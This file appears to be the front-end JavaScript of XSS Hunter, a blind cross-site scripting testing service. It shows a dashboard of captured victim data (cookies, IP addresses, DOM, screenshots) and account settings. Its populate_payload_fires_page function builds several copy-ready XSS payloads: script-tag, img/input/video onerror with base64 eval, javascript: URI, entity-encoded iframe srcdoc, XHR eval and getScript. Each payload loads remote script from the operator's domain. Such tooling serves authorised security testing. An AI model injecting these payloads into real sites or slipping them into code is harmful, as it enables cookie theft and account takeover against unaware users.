injection_results = [];
collected_page_data = [];
expanded_report_id = "";
expanded_collected_page_id = "";

BASE_DOMAIN = ( location.host.toString() )
possible_csrf_token = localStorage.getItem("CSRF_TOKEN");

$( ".xsshunter_application" ).width( screen.width );

$( window ).on("resize", function() {
    $( ".xsshunter_application" ).width( screen.width );
});

if( possible_csrf_token !== null ) {
    CSRF_TOKEN = possible_csrf_token;
    get_user_data( function() {
        show_app();
    }, function() {
        show_log_in_prompt();
    });
} else {
    show_log_in_prompt();
}

$( "#login_button" ).on("click", function() {
    login();
});

$( "#username" ).on("keyup",function(e){
    if(e.code == "Enter") {
        login();
    }
});

$( "#password" ).on("keyup",function(e){
    if(e.code == "Enter") {
        login();
    }
});

$( "#update_account_button" ).on("click", function() {
    update_account_setings();
});

$( "#reset_password_button" ).on("click",function() {
    perform_password_reset();
});

$( "#go_back_to_login_form_button" ).on("click", function() {
    hide_password_reset();
});

function show_log_in_prompt() {
    $( ".login-in-form" ).fadeIn();
    $( "#username" ).select();
}

function get_user_data( success_callback, failed_callback ) {
    api_request( "GET", "/api/user", {}, function( response ){
        if ( response["error"] == undefined ) {
            USER = response;
            populate_settings_page();
            populate_payload_fires_page();
            success_callback();
        } else {
            failed_callback();
        }
    });
}

// These two functions delete the item from the client side cache
function delete_injection( id ) {
    for( var i = 0; i < injection_results.length; i++ ) {
        if( injection_results[i]["UUID"] == id ) {
            injection_results.splice( i, 1 );
            return true;
        }
    }
    return false;
}

function delete_collected_page( id ) {
    for( var i = 0; i < collected_page_data.length; i++ ) {
        if( collected_page_data[i]["UUID"] == id ) {
            collected_page_data.splice( i, 1 );
            return true;
        }
    }
    return false;
}

function get_injection_data_from_id( id ) {
    for( var i = 0; i < injection_results.length; i++ ) {
        if( injection_results[i]["UUID"] == id ) {
            return injection_results[i];
        }
    }
    return false;
}

function get_injection_row_offset( id ) {
    for( var i = 0; i < injection_results.length; i++ ) {
        if( injection_results[i]["UUID"] == id ) {
            return i;
        }
    }
    return false;
}

function get_collected_page_row_offset( id ) {
    for( var i = 0; i < collected_page_data.length; i++ ) {
        if( collected_page_data[i]["UUID"] == id ) {
            return i;
        }
    }
    return false;
}

function get_collected_page_data_from_id( id ) {
    for( var i = 0; i < collected_page_data.length; i++ ) {
        if( collected_page_data[i]["UUID"] == id ) {
            return collected_page_data[i];
        }
    }
    return false;
}

function is_safe_uri( url ) {
    return ( url.toLowerCase().startsWith( "http://" ) || url.toLowerCase().startsWith( "https://" ) );
}

function display_full_report( id ) {
    expanded_report_id = id;

    $( ".full_injection_report_expanded" ).remove();
    let full_report_row = $.parseHTML( '<tr class="full_injection_report_expanded"><td class="full_injection_report_container" colspan="4"><a href="" target="_blank" class="full_report_screenshot_link"><img class="full_report_screenshot"/></a><div class="panel panel-default"><div class="injection_full_report_top_panel panel-heading"><h3 class="panel-title">Vulnerable Page URL</h3></div><div class="full_report_vulnerable_page_url panel-body"></div></div><div class="panel panel-default"><div class="panel-heading"><h3 class="panel-title">Execution Origin</h3></div><div class="full_report_execution_origin panel-body"></div></div><div class="panel panel-default"><div class="panel-heading"><h3 class="panel-title">User IP Address</h3></div><div class="full_report_user_ip_address panel-body"></div></div><div class="panel panel-default"><div class="panel-heading"><h3 class="panel-title">Referer</h3></div><div class="full_report_referer panel-body"></div></div><div class="panel panel-default"><div class="panel-heading"><h3 class="panel-title">Victim User Agent</h3></div><div class="full_report_user_agent panel-body"></div></div><div class="panel panel-default"><div class="panel-heading"><h3 class="panel-title">Cookies</h3></div><div class="full_report_cookies panel-body"></div></div><div class="panel panel-default"><div class="panel-heading"><h3 class="panel-title">DOM</h3></div><div class="full_report_dom panel-body"></div></div> <div class="panel panel-default"><div class="panel-heading"><h3 class="panel-title">Injection Point (Raw HTTP Request)</h3></div><div class="full_report_http panel-body"></div></div></td></tr>')[0];
    let i = get_injection_row_offset( id );
    let injection = get_injection_data_from_id( id );

    let vulnerable_page_link = document.createElement( "a" );
    if( is_safe_uri( injection["uri"] ) ) {
        vulnerable_page_link.href = injection["uri"];
    }
    vulnerable_page_link.target = "_blank";
    vulnerable_page_link.text = injection["uri"];
    full_report_row.querySelector( ".full_report_vulnerable_page_url" ).appendChild( vulnerable_page_link );

    let victim_ip_trace_link = document.createElement( "a" );
    victim_ip_trace_link.href = "http://www.ip-tracker.org/locator/ip-lookup.php?ip=" + injection["ip"];
    victim_ip_trace_link.target = "_blank";
    victim_ip_trace_link.text = injection["ip"];
    full_report_row.querySelector( ".full_report_user_ip_address" ).appendChild( victim_ip_trace_link );

    let referer = document.createElement( "code" );
    referer.textContent = injection["referrer"];
    full_report_row.querySelector( ".full_report_referer" ).appendChild( referer );

    let user_agent = document.createElement( "code" );
    user_agent.textContent = injection["user-agent"];
    full_report_row.querySelector( ".full_report_user_agent" ).appendChild( user_agent );

    let cookies = document.createElement( "code" );
    cookies.textContent = injection["cookies"];
    full_report_row.querySelector( ".full_report_cookies" ).appendChild( cookies );

    let origin = document.createElement( "code" );
    origin.textContent = injection["origin"];
    full_report_row.querySelector( ".full_report_execution_origin" ).appendChild( origin );

    let dom = document.createElement( "pre" );
    dom.className = "prettyprint linenums lang-html injection_html_dom";
    dom.textContent = injection["dom"];
    dom.setAttribute( "data-lang", "html" );
    full_report_row.querySelector( ".full_report_dom" ).appendChild( dom );

    let http_request = document.createElement( "pre" );
    http_request.className = "prettyprint linenums lang-http injection_http_request";
    http_request.textContent = injection["injection_key"];
    http_request.setAttribute( "data-lang", "http" );
    full_report_row.querySelector( ".full_report_http" ).appendChild( http_request );

    let screenshot_link = injection["screenshot"];

    full_report_row.querySelector( ".full_report_screenshot" ).src = screenshot_link;
    full_report_row.querySelector( ".full_report_screenshot_link" ).href = screenshot_link;

    $('#injection_data_table > tbody > tr').eq( i ).after( full_report_row.outerHTML );

    prettyPrint();
    $('html, body').animate({
        scrollTop: $("#" + id).offset().top - 60
    }, 500);
}

function display_full_page_report( id ) {
    expanded_collected_page_id = id;

    let i = get_collected_page_row_offset( id );
    let collected_pages = get_collected_page_data_from_id( id );
    let full_page_row = $.parseHTML('<td colspan="2" class="collected_page_full_page_view"><div class="panel panel-default"><div class="panel-heading"><h3 class="panel-title">DOM</h3></div><div class="full_page_report_dom panel-body"></div></div></td>')[0];
    $( ".collected_page_full_page_view" ).remove();

    var dom = document.createElement( "pre" );
    dom.className = "prettyprint linenums lang-html";
    dom.textContent = collected_pages["page_html"];
    dom.setAttribute( "data-lang", "html" );
    full_page_row.querySelector( ".full_page_report_dom" ).appendChild( dom );

    $('#collected_pages_data_rows > tr').eq( i ).after( full_page_row.outerHTML );

    prettyPrint();
    $('html, body').animate({
        scrollTop: $("#" + id).offset().top - 60
    }, 500);
}

function populate_xss_fires( offset, limit ) {
    document.querySelector( "#injection_data_rows" ).innerHTML = "";
    api_request( "GET", "/api/payloadfires", {"offset": offset, "limit": limit}, function( response ) {
        create_paginator_widget( 5, offset, response["total"], ".xss_payload_fires_paginator_div", populate_xss_fires );
        injection_results = response["results"];
        for( let i = 0; i < response["results"].length; i++ ) {
            append_xss_fire_row( response["results"][i] );
        }
        // Sets the image thumbnails to links of the image thumbnails ( to view the full sized image )
        $(".xss_fire_thumbnail_image_link").on("click",function() {
            this.target = "_blank";
            this.href = this.childNodes[0].src;
        })

        $( ".view_full_report_button" ).on("click",function() {
            let parent_id = this.parentElement.parentElement.id;
            if( parent_id == expanded_report_id ) {
                $( ".full_injection_report_expanded" ).remove();
                expanded_report_id = "";
            } else {
                display_full_report( parent_id );
            }
        });

    });
}

function populate_collected_pages( offset, limit ) {
    document.querySelector( "#collected_pages_data_rows" ).innerHTML = "";
    api_request( "GET", "/api/collected_pages", {"offset": offset, "limit": limit}, function( response ) {
        create_paginator_widget( 5, offset, response["total"], ".collected_pages_paginator_div", populate_collected_pages );
        collected_page_data = response["results"];
        for( let i = 0; i < collected_page_data.length; i++ ) {
            append_collected_page_row( collected_page_data[i] );
        }
        $( ".view_full_page_source_button" ).on("click",function() {
            let parent_id = this.parentElement.parentElement.id;
            if( parent_id == expanded_report_id ) {
                $( ".collected_page_full_page_view" ).remove();
                expanded_report_id = "";
            } else {
                display_full_page_report( parent_id );
            }
        });
    });
}

function append_collected_page_row( collected_page_data ) {
    var example_row = $.parseHTML( '<tr class="xss_fire_row_template"><td class="collected_pages_uri_td"><span class="collected_pages_uri_text"><a href="" class="collected_page_link"></a></span></td><td class="collected_pages_options_button_td"><button type="button" class="view_full_page_source_button btn btn-info btn-block"><span class="glyphicon glyphicon-eye-open"></span> View Page Details</button><button type="button" id="delete_collected_page_button_' + collected_page_data["UUID"] + '" class="delete_collected_page_button btn btn-danger btn-block"><span class="glyphicon glyphicon-trash"></span> Delete</button></td></tr>')[0];
    example_row.id = collected_page_data["UUID"];
    $( example_row ).find( ".collected_page_link" ).text( collected_page_data["uri"] );
    $( example_row ).find( ".collected_page_link" ).attr( "href", "#" );
    
    document.querySelector( "#collected_pages_data_rows" ).appendChild( example_row );

    $("#delete_collected_page_button_" + collected_page_data["UUID"] ).on( "click", function() {
        api_request( "DELETE", "/api/delete_collected_page", {"UUID": collected_page_data["UUID"]}, function( response ) {
            delete_collected_page( collected_page_data["UUID"] );
            $( "#" + collected_page_data["UUID"] ).fadeOut();
            $( "#" + collected_page_data["UUID"] ).remove();
            if( expanded_collected_page_id == collected_page_data["UUID"] ) {
                $( ".collected_page_full_page_view" ).remove();
            }
        });
    });
}

function append_xss_fire_row( injection_data ) {
    let example_row = $.parseHTML( '<tr class="xss_fire_row_template"><td class="xss_fire_thumbnail_column"><a class="xss_fire_thumbnail_image_link"><img class="xss_fire_thumbnail_image" src=""/></a></td><td class="victim_ip_address_column"><a target="_blank" class="ip_address_trace_link" href=""></a></td><td class="vulnerable_page_uri_column"><a target="_blank" class="vulnerable_page_uri"></a></td><td class="xss_payload_fire_options_column"><button type="button" class="view_full_report_button btn btn-info btn-block"><span class="glyphicon glyphicon-eye-open"></span> View Full Report</button><button type="button" id="resend_email_button_' + injection_data["UUID"] + '" class="btn btn-info btn-block"><span class="glyphicon glyphicon-envelope"></span> Resend Email Report</button><button type="button" id="delete_injection_button_' + injection_data["UUID"] + '" class="delete_injection_button btn btn-danger btn-block"><span class="glyphicon glyphicon-trash"></span> Delete</button></td></tr>')[0];
    example_row.id = injection_data["UUID"];
    example_row.querySelector( ".xss_fire_thumbnail_image" ).src = injection_data["screenshot"];
    example_row.querySelector( ".ip_address_trace_link" ).href = "http://www.ip-tracker.org/locator/ip-lookup.php?ip=" + injection_data["ip"];
    example_row.querySelector( ".ip_address_trace_link" ).text = injection_data["ip"];
    example_row.querySelector( ".vulnerable_page_uri" ).text = injection_data["uri"];
    if( is_safe_uri( injection_data["uri"] ) ) {
        example_row.querySelector( ".vulnerable_page_uri" ).href = injection_data["uri"];
    }
    document.querySelector( "#injection_data_rows" ).appendChild( example_row );

    $("#delete_injection_button_" + injection_data["UUID"] ).click( function() {
        api_request( "DELETE", "/api/delete_injection", {"UUID": injection_data["UUID"]}, function( response ) {
            delete_injection( injection_data["UUID"] );
            $( "#" + injection_data["UUID"] ).fadeOut();
            $( "#" + injection_data["UUID"] ).remove();
            if( expanded_report_id == injection_data["UUID"] ) {
                $( ".full_injection_report_expanded" ).remove();
            }
        });
    });

    $("#resend_email_button_" + injection_data["UUID"] ).click( function() {
        api_request( "POST", "/api/resend_injection_email", {"UUID": injection_data["UUID"]}, function( response ) {
            var resend_button = $( "#resend_email_button_" + injection_data["UUID"] );
            resend_button.unbind();
            resend_button.html( '<span class="glyphicon glyphicon-ok"></span> Email Sent!' );
            resend_button.removeClass( "btn-info" );
            resend_button.addClass( "btn-success" );
            resend_button.addClass( "btn-success" );
            resend_button.prop( "disabled", true );
        });
    })
}

function create_paginator_widget( count, offset, total, target_div_selector, page_change_callback ) {
    var paginator = $.parseHTML( '<ul class="pagination"></ul>' )[0];
    var paginator_previous_button = $.parseHTML( '<li class="previous_page_button"><a>PREV</a></li>' )[0];
    var paginator_next_button = $.parseHTML( '<li class="next_page_button"><a>NEXT</a></li>' )[0];
    var paginator_number_button = $.parseHTML( '<li class="page_number"><a></a></li>' )[0];
    var pages = Math.ceil( total / count );
    var current_page = Math.ceil( offset / count );

    if( current_page == 0 ) {
        paginator_previous_button.className = paginator_previous_button.className + " disabled";
    }

    paginator.appendChild( paginator_previous_button );

    for( var i = 0; i < pages; i++ ) {
        var number_button_copy = paginator_number_button.cloneNode(true);

        if( i == current_page ) {
            number_button_copy.className = number_button_copy.className + " active";
        }
        number_button_copy.querySelector( "a" ).text = i.toString();
        paginator.appendChild( number_button_copy );
    }

    paginator.appendChild( paginator_next_button );

    if( current_page >= ( pages - 1 ) ) {
        paginator_next_button.className = paginator_next_button.className + " disabled";
    }

    $( target_div_selector ).empty().append( paginator );

    $( target_div_selector ).find( ".page_number" ).on("click",function() {
        current_page_number = parseInt( this.childNodes[0].text );
        page_change_callback( ( current_page_number * 5 ), 5 );
    });

    $( target_div_selector ).find( ".next_page_button" ).on("click",function() {
        next_page = ( parseInt( $( target_div_selector ).find(".page_number.active")[0].childNodes[0].text ) + 1 )
        page_change_callback( ( next_page * 5 ), 5 );
    });

    $( target_div_selector ).find( ".previous_page_button" ).on("click",function() {
        next_page = ( parseInt( $( target_div_selector ).find(".page_number.active")[0].childNodes[0].text ) - 1 )
        page_change_callback( ( next_page * 5 ), 5 );
    });
}

function update_account_setings() {
    let userChange = {
        full_name: $( "#full_name" ).val(),
        pgp_key: $( "#pgp-key" ).val(),
        email:  $( "#email" ).val(),
        page_collection_paths_list: $( "#page_collection_paths_list" ).val().split(/\r?\n/),
        chainload_uri: $( "#chainload_uri" ).val(),
        email_enabled: $('#email_enabled').is(':checked'),
        password: $( "#settings_password" ).val(),
        current_password: $( "#settings_current_password" ).val()
    }

    USER.full_name = $( "#full_name" ).val();
    USER.pgp_key = $( "#pgp-key" ).val();
    USER.email = $( "#email" ).val(),
    USER.page_collection_paths_list = $( "#page_collection_paths_list" ).val();
    USER.chainload_uri = $( "#chainload_uri" ).val();
    USER.email_enabled = $('#email_enabled').is(':checked');

    api_request( "PUT", "/api/user", userChange, function( response ) {
        if( response["success"] == false ) {
            $( ".invalid_fields" ).text( response["message"] )
            $( ".bad_account_update_dialogue" ).fadeIn();
            setTimeout( function() {
                $( ".bad_account_update_dialogue" ).fadeOut();
            }, 10000);
        } else {
            populate_payload_fires_page();
            $( ".updated_settings_success_dialogue" ).fadeIn();
            setTimeout( function() {
                $( ".updated_settings_success_dialogue" ).fadeOut();
            }, 5000);
        }
    });
}

function populate_settings_page() {
    $( "#full_name" ).val( USER.full_name );
    $( "#domain" ).val( "https://" + USER.domain + "." + BASE_DOMAIN );
    $( "#pgp-key" ).val( USER.pgp_key );
    $( "#email" ).val( USER.email );
    $( "#page_collection_paths_list" ).val( USER.page_collection_paths_list.join("\n") );
    $( "#chainload_uri" ).val( USER.chainload_uri );
    $( "#email_enabled" ).prop('checked', USER.email_enabled);

    $( "#owner_correlation_key" ).val( USER.owner_correlation_key );
    $( "#owner_correlation_key" ).click( function() {
        $( "#owner_correlation_key" ).select();
    });
    document.querySelector( ".injection_correlation_key_copy" ).setAttribute( "data-clipboard-text", USER.owner_correlation_key );
}

function populate_payload_fires_page() {
    var domain = USER.domain + "." + BASE_DOMAIN;
    var js_attrib_js = 'var a=document.createElement("script");a.src="https://' + domain + '";document.body.appendChild(a);';
    var generic_script_tag_payload = "\"><script src=https://" + domain + "></script>";
    var image_tag_payload = "\"><img src=x id=" + html_encode( btoa( js_attrib_js ) ) + " onerror=eval(atob(this.id))>";
    var javascript_uri_payload = "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + domain + "\\';document.body.appendChild(a)')";
    var input_tag_payload = "\"><input onfocus=eval(atob(this.id)) id=" + html_encode( btoa( js_attrib_js ) ) + " autofocus>";
    var source_tag_payload = "\"><video><source onerror=eval(atob(this.id)) id=" + html_encode( btoa( js_attrib_js ) ) + ">";
    var srcdoc_tag_payload = "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;" + domain + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">";
    var xhr_payload = '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + domain + '");a.send();</script>'
    var getscript_payload = '<script>$.getScript("//' + domain + '")</script>';

    $( "#generic_script_tag_payload" ).val( generic_script_tag_payload );
    $( "#generic_script_tag_payload" ).click( function() {
        $( "#generic_script_tag_payload" ).select();
    });
    document.querySelector( ".generic_script_tag_payload_copy" ).setAttribute( "data-clipboard-text", generic_script_tag_payload );

    $( "#img_tag_payload" ).val( image_tag_payload );
    $( "#img_tag_payload" ).click( function() {
        $( "#img_tag_payload" ).select();
    });
    document.querySelector( ".img_tag_payload_copy" ).setAttribute( "data-clipboard-text", image_tag_payload );

    $( "#javascript_uri_payload" ).val( javascript_uri_payload );
    $( "#javascript_uri_payload" ).click( function() {
        $( "#javascript_uri_payload" ).select();
    });
    document.querySelector( ".javascript_uri_payload_copy" ).setAttribute( "data-clipboard-text", javascript_uri_payload );

    $( "#input_tag_payload" ).val( input_tag_payload );
    $( "#input_tag_payload" ).click( function() {
        $( "#input_tag_payload" ).select();
    });
    document.querySelector( ".input_tag_payload_copy" ).setAttribute( "data-clipboard-text", input_tag_payload );

    $( "#source_tag_payload" ).val( source_tag_payload );
    $( "#source_tag_payload" ).click( function() {
        $( "#source_tag_payload" ).select();
    });
    document.querySelector( ".source_tag_payload_copy" ).setAttribute( "data-clipboard-text", source_tag_payload );

    $( "#srcdoc_tag_payload" ).val( srcdoc_tag_payload );
    $( "#srcdoc_tag_payload" ).click( function() {
        $( "#srcdoc_tag_payload" ).select();
    });
    document.querySelector( ".srcdoc_tag_payload_copy" ).setAttribute( "data-clipboard-text", srcdoc_tag_payload );

    $( "#xhr_payload" ).val( xhr_payload );
    $( "#xhr_payload" ).click( function() {
        $( "#xhr_payload" ).select();
    });
    document.querySelector( ".xhr_payload_copy" ).setAttribute( "data-clipboard-text", xhr_payload );

    $( "#getscript_payload" ).val( getscript_payload );
    $( "#getscript_payload" ).click( function() {
        $( "#getscript_payload" ).select();
    });
    document.querySelector( ".getscript_payload_copy" ).setAttribute( "data-clipboard-text", getscript_payload );

    var clipboardDemos = new Clipboard('[data-clipboard-button]');
}

function html_encode( value ){
    return String( value ).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace( /=/g, '&#61;' ).replace( / /g, '&#32;' );
}

function convert_to_hex( str ) {
    var hex = '';
    for(var i=0;i<str.length;i++) {
        hex += ''+str.charCodeAt(i).toString(16);
    }
    return hex;
}

function show_app() {
    var logout_navbar_button = $.parseHTML( '<li><a class="logout_button">Logout</a></li>' )
    $( '.navbar-nav' ).append( logout_navbar_button );

    $( ".logout_button" ).on("click",function() {
        api_request( "GET", "/api/logout", {}, function() {
            location.reload();
        });
    });

    populate_xss_fires( 0, 5 );
    populate_collected_pages( 0, 5 );
    get_user_data( function() {
        $( ".login-in-form" ).fadeOut(function(){
            $( ".xsshunter_application" ).fadeIn();
        });
    });
}

function show_password_reset() {
    $( ".bad_password_dialogue" ).fadeOut();
    $( ".login-in-form" ).fadeOut();
    $( ".reset-password-form").fadeIn();
}

function hide_password_reset() {
    $( ".login-in-form" ).fadeIn();
    $( ".reset-password-form").fadeOut();
}

function perform_password_reset() {
    $( ".bad_password_dialogue" ).fadeOut();
    show_loading_bar();

    var username = $( "#reset_password_username" ).val();

    var post_data = {
        "username": username,
    };

    api_request( "POST", "/api/password_reset", post_data, function( data ) {
        hide_loading_bar();
        if( data["success"] == true ) {
            //
        } else {
            $( ".bad_password_dialogue" ).fadeIn();
            $( ".bad_password_dialogue" ).text( data["error"] );
        }
    })
};

function login() {
    $( ".bad_password_dialogue" ).fadeOut();
    show_loading_bar();

    let post_data = {
        "username": $( "#username" ).val(),
        "password": $( "#password" ).val(),
    };

    api_request( "POST", "/api/login", post_data, function( data ) {
        hide_loading_bar();
        if( data["success"] == true ) {
            CSRF_TOKEN = data["csrf_token"];
            localStorage.setItem( "CSRF_TOKEN", CSRF_TOKEN );
            show_app();
        } else {
            $( ".bad_password_dialogue" ).fadeIn();
            $( ".bad_password_dialogue" ).text( data["message"] );
            $( "#username" ).select();
        }
    })
};
$('[data-toggle="popover"]').popover({
    trigger: 'hover','placement': 'top'
});
